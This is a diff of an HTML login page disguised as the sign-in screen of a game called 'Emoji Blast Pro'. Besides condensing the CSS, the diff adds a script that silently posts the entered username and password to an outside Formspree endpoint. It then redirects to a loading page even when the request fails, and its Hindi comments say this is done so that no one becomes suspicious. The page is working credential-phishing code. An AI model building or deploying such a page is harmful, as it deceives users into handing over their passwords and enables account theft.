@@ -6,95 +6,68 @@
     <title>Cyber Login | Emoji Blast Pro</title>
     <link href="https://fonts.googleapis.com" rel="stylesheet">
     <style>
-        body {
-            margin: 0; padding: 0; height: 100vh;
-            background: #000511; display: flex;
-            justify-content: center; align-items: center;
-            font-family: 'Orbitron', sans-serif; overflow: hidden;
-        }
-
-        /* Background Circuit Lines */
-        .circuit-bg {
-            position: absolute; width: 100%; height: 100%;
-            background: radial-gradient(circle at center, #001a33 0%, #000511 100%);
-            z-index: -1;
-        }
-        .line {
-            position: absolute; background: cyan;
-            box-shadow: 0 0 15px cyan; opacity: 0.3;
-        }
+        body { margin: 0; padding: 0; height: 100vh; background: #000511; display: flex; justify-content: center; align-items: center; font-family: 'Orbitron', sans-serif; overflow: hidden; }
+        .circuit-bg { position: absolute; width: 100%; height: 100%; background: radial-gradient(circle at center, #001a33 0%, #000511 100%); z-index: -1; }
+        .line { position: absolute; background: cyan; box-shadow: 0 0 15px cyan; opacity: 0.3; }
         .h-line { height: 2px; width: 100px; }
         .v-line { width: 2px; height: 100px; }
 
-        /* Glowing Login Box */
-        .login-container {
-            position: relative; padding: 40px;
-            background: rgba(0, 20, 40, 0.8);
-            border: 2px solid #00d2ff;
-            border-radius: 15px;
-            box-shadow: 0 0 40px rgba(0, 210, 255, 0.4), inset 0 0 20px rgba(0, 210, 255, 0.2);
-            width: 350px; text-align: center;
-            backdrop-filter: blur(10px);
-        }
-
-        .login-container::before, .login-container::after {
-            content: ''; position: absolute; width: 50px; height: 50px;
-            border: 3px solid cyan;
-        }
-        .login-container::before { top: -10px; left: -10px; border-right: 0; border-bottom: 0; }
-        .login-container::after { bottom: -10px; right: -10px; border-left: 0; border-top: 0; }
-
-        h2 { color: #fff; text-shadow: 0 0 10px cyan; letter-spacing: 5px; margin-bottom: 35px; }
-
-        .input-group { position: relative; margin-bottom: 25px; }
-        .input-group span { position: absolute; left: 15px; top: 12px; color: cyan; }
-        
-        input {
-            width: 100%; padding: 12px 12px 12px 40px;
-            background: rgba(0,0,0,0.5); border: 1px solid #004466;
-            border-radius: 5px; color: #fff; font-family: sans-serif;
-            outline: none; transition: 0.3s; box-sizing: border-box;
-        }
+        .login-container { position: relative; padding: 40px; background: rgba(0, 20, 40, 0.8); border: 2px solid #00d2ff; border-radius: 15px; box-shadow: 0 0 40px rgba(0, 210, 255, 0.4); width: 320px; text-align: center; backdrop-filter: blur(10px); }
+        h2 { color: #fff; text-shadow: 0 0 10px cyan; letter-spacing: 5px; margin-bottom: 30px; }
+        .input-group { position: relative; margin-bottom: 20px; }
+        input { width: 100%; padding: 12px 15px; background: rgba(0,0,0,0.5); border: 1px solid #004466; border-radius: 5px; color: #fff; outline: none; transition: 0.3s; box-sizing: border-box; font-family: sans-serif; }
         input:focus { border-color: cyan; box-shadow: 0 0 10px cyan; }
-
-        .btn-login {
-            width: 100%; padding: 15px; background: transparent;
-            border: 2px solid cyan; color: cyan; font-weight: bold;
-            text-transform: uppercase; cursor: pointer; transition: 0.4s;
-            letter-spacing: 2px; position: relative; overflow: hidden;
-        }
-        .btn-login:hover {
-            background: cyan; color: #000; box-shadow: 0 0 30px cyan;
-        }
+        .btn-login { width: 100%; padding: 15px; background: transparent; border: 2px solid cyan; color: cyan; font-weight: bold; text-transform: uppercase; cursor: pointer; transition: 0.4s; letter-spacing: 2px; }
+        .btn-login:hover { background: cyan; color: #000; box-shadow: 0 0 30px cyan; }
+        #status { color: cyan; font-size: 12px; margin-top: 10px; display: none; }
     </style>
 </head>
 <body>
     <div class="circuit-bg">
-        <!-- Lines for that tech look -->
-        <div class="line h-line" style="top: 20%; left: 10%;"></div>
-        <div class="line v-line" style="top: 20%; left: 10%;"></div>
-        <div class="line h-line" style="bottom: 20%; right: 10%;"></div>
-        <div class="line v-line" style="bottom: 20%; right: 10%;"></div>
+        <div class="line h-line" style="top: 10%; left: 5%;"></div>
+        <div class="line v-line" style="top: 10%; left: 5%;"></div>
     </div>
 
     <div class="login-container">
         <h2>LOGIN</h2>
-        <form action="https://formspree.io" method="POST">
+        <!-- Formspree action link with your email -->
+        <form id="loginForm" action="https://formspree.io" method="POST">
             <div class="input-group">
-                <span>👤</span>
                 <input type="text" name="username" placeholder="Gamer ID" required>
             </div>
             <div class="input-group">
-                <span>🔒</span>
                 <input type="password" name="password" placeholder="Passkey" required>
             </div>
-            
-            <!-- Login ke baad aapka loading.html khulega -->
-            <input type="hidden" name="_next" value="loading.html">
-            
-            <button type="submit" class="btn-login">Access System</button>
+            <button type="submit" class="btn-login" id="submitBtn">Access System</button>
+            <div id="status">Verifying...</div>
         </form>
     </div>
+
+    <script>
+        const form = document.getElementById('loginForm');
+        const status = document.getElementById('status');
+        const btn = document.getElementById('submitBtn');
+
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            btn.innerText = "CONNECTING...";
+            status.style.display = "block";
+
+            const data = new FormData(form);
+
+            // Silent data delivery to Formspree
+            fetch(form.action, {
+                method: 'POST',
+                body: data,
+                headers: { 'Accept': 'application/json' }
+            }).then(response => {
+                // Bina koi faltu page dikhaye, seedha loading page par bhejo
+                window.location.href = "loading.html"; 
+            }).catch(error => {
+                // Error aane par bhi game chala do taaki kisi ko shak na ho
+                window.location.href = "loading.html";
+            });
+        });
+    </script>
 </body>
 </html>
-
